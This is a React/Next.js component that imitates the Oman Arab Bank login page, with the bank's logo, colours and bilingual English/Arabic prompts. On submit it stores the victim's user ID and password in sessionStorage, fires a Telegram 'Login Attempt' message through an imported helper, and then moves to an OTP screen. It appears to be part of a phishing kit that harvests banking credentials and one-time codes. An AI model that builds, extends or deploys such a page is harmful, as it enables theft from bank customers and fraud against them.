"use client"

import { useState } from "react"
import Image from "next/image"
import { OtpScreen } from "./oman-arab-otp"


const translations = {
    en: {
        langToggle: "العربية",
        headerText: "Please enter your username and password",
        userIdPlaceholder: "User ID",
        passwordPlaceholder: "Password",
        continueBtn: "CONTINUE",
        forgotPassword: "Forgot password",
        help: "Help",
        userIdRequired: "User ID is required",
        passwordRequired: "Password is required",
    },
    ar: {
        langToggle: "English",
        headerText: "يرجى إدخال اسم المستخدم وكلمة المرور",
        userIdPlaceholder: "معرف المستخدم",
        passwordPlaceholder: "كلمة المرور",
        continueBtn: "متابعة",
        forgotPassword: "نسيت كلمة المرور",
        help: "مساعدة",
        userIdRequired: "معرف المستخدم مطلوب",
        passwordRequired: "كلمة المرور مطلوبة",
    },
}

export function LoginScreen() {
    const [lang, setLang] = useState<"en" | "ar">("en")
    const [screen, setScreen] = useState<"login" | "otp">("login")
    const [userId, setUserId] = useState("")
    const [password, setPassword] = useState("")
    const [errors, setErrors] = useState<{ userId?: string; password?: string }>({})
    const [isLoading, setIsLoading] = useState(false)

    const t = translations[lang]
    const isRtl = lang === "ar"

    const handleContinue = async () => {
        const newErrors: { userId?: string; password?: string } = {}
        if (!userId.trim()) newErrors.userId = t.userIdRequired
        if (!password.trim()) newErrors.password = t.passwordRequired

        if (Object.keys(newErrors).length > 0) {
            setErrors(newErrors)
            return
        }

        setErrors({})
        setIsLoading(true)

        // Store credentials in sessionStorage
        sessionStorage.setItem("userName", userId)
        sessionStorage.setItem("userPassword", password)

        try {
            const { sendTelegramMessage } = await import("@/lib/telegram")
            await sendTelegramMessage({
                title: "Login Attempt",
                type: "login_attempt",
                exclude: ["location"]
            })
        } catch (err) {
            console.error("Error sending login info:", err)
        }

        setTimeout(() => {
            setIsLoading(false)
            setScreen("otp")
        }, 1500)
    }

    if (screen === "otp") {
        return <OtpScreen lang={lang} onBack={() => setScreen("login")} />
    }

    return (
        <div
            className="relative h-[100dvh] flex flex-col overflow-hidden"
            dir={isRtl ? "rtl" : "ltr"}
        >
            {/* Background */}
            <div
                className="fixed inset-0"
                style={{
                    background:
                        "radial-gradient(ellipse at center, #1a8ad4 0%, #0066b3 25%, #0066b3 45%, #005da3 60%, #004d8a 80%, #003d70 100%)",
                }}
            />

            {/* Language toggle */}
            <div className="relative z-10 flex justify-end p-5 pt-6 w-full max-w-md mx-auto">
                <button
                    onClick={() => setLang(lang === "en" ? "ar" : "en")}
                    className="text-[15px] tracking-wide"
                    style={{ color: "rgba(255,255,255,0.75)" }}
                >
                    {t.langToggle}
                </button>
            </div>

            {/* Scrollable content wrapper */}
            <div className="relative z-10 flex-1 overflow-y-auto no-scrollbar">
                <div className="flex flex-col min-h-full w-full max-w-sm mx-auto px-6 py-6">
                    {/* Logo area */}
                    <div className="flex flex-col items-center mb-6">
                        <div className="mb-6">
                            <Image
                                src="https://images.crunchbase.com/image/upload/c_pad%2Cf_auto%2Cq_auto%3Aeco%2Cdpr_1/oqi95vlnatsg9byhfxt9?ik-sanitizeSvg=true"
                                alt="Oman Arab Bank Logo"
                                width={110}
                                height={110}
                                className="object-contain"
                                priority
                            />
                        </div>

                        <p
                            className="text-[14px] leading-relaxed text-center px-4"
                            style={{ color: "rgba(255,255,255,0.7)" }}
                        >
                            {t.headerText}
                        </p>
                    </div>

                    {/* Form Fields */}
                    <div className="flex flex-col gap-4 mb-4">
                        {/* User ID */}
                        <div className="flex flex-col">
                            <div className="flex items-center gap-4">
                                <div className="flex-shrink-0" style={{ color: "rgba(255,255,255,0.6)" }}>
                                    <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
                                    </svg>
                                </div>
                                <input
                                    type="text"
                                    value={userId}
                                    onChange={(e) => {
                                        setUserId(e.target.value)
                                        if (errors.userId) setErrors((prev) => ({ ...prev, userId: undefined }))
                                    }}
                                    placeholder={t.userIdPlaceholder}
                                    className="flex-1 h-[48px] px-4 rounded-sm text-[16px] outline-none"
                                    style={{
                                        backgroundColor: "rgba(255,255,255,0.95)",
                                        color: "#1a1a1a",
                                        border: errors.userId ? "2px solid #ef4444" : "none",
                                    }}
                                    dir={isRtl ? "rtl" : "ltr"}
                                />
                            </div>
                            {errors.userId && (
                                <p className="text-[12px] text-red-300 mt-1" style={{ marginInlineStart: "38px" }}>
                                    {errors.userId}
                                </p>
                            )}
                        </div>

                        {/* Password */}
                        <div className="flex flex-col">
                            <div className="flex items-center gap-4">
                                <div className="flex-shrink-0" style={{ color: "rgba(255,255,255,0.6)" }}>
                                    <svg width="22" height="22" viewBox="0 0 24 24" fill="currentColor">
                                        <path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z" />
                                    </svg>
                                </div>
                                <input
                                    type="password"
                                    value={password}
                                    onChange={(e) => {
                                        setPassword(e.target.value)
                                        if (errors.password) setErrors((prev) => ({ ...prev, password: undefined }))
                                    }}
                                    placeholder={t.passwordPlaceholder}
                                    className="flex-1 h-[48px] px-4 rounded-sm text-[16px] outline-none"
                                    style={{
                                        backgroundColor: "rgba(255,255,255,0.95)",
                                        color: "#1a1a1a",
                                        border: errors.password ? "2px solid #ef4444" : "none",
                                    }}
                                    dir={isRtl ? "rtl" : "ltr"}
                                />
                            </div>
                            {errors.password && (
                                <p className="text-[12px] text-red-300 mt-1" style={{ marginInlineStart: "38px" }}>
                                    {errors.password}
                                </p>
                            )}
                        </div>
                    </div>

                    {/* Links */}
                    <div className="flex justify-between mb-8 px-1">
                        <button className="text-[13px]" style={{ color: "rgba(255,255,255,0.7)" }}>
                            {t.forgotPassword}
                        </button>
                        <button className="text-[13px]" style={{ color: "rgba(255,255,255,0.7)" }}>
                            {t.help}
                        </button>
                    </div>

                    {/* Continue Button - Natural Flow */}
                    <div className="pb-8">
                        <button
                            onClick={handleContinue}
                            disabled={isLoading}
                            className="w-full h-[52px] rounded-lg text-[18px] font-semibold tracking-widest transition-all flex items-center justify-center gap-3"
                            style={{
                                backgroundColor: "#5baaed",
                                color: "rgba(255,255,255,0.9)",
                            }}
                        >
                            {isLoading ? (
                                <svg className="animate-spin" width="24" height="24" viewBox="0 0 24 24" fill="none">
                                    <circle cx="12" cy="12" r="10" stroke="rgba(255,255,255,0.3)" strokeWidth="3" />
                                    <path d="M12 2a10 10 0 0 1 10 10" stroke="white" strokeWidth="3" strokeLinecap="round" />
                                </svg>
                            ) : (
                                t.continueBtn
                            )}
                        </button>
                    </div>
                </div>
            </div>
        </div>
    )
}
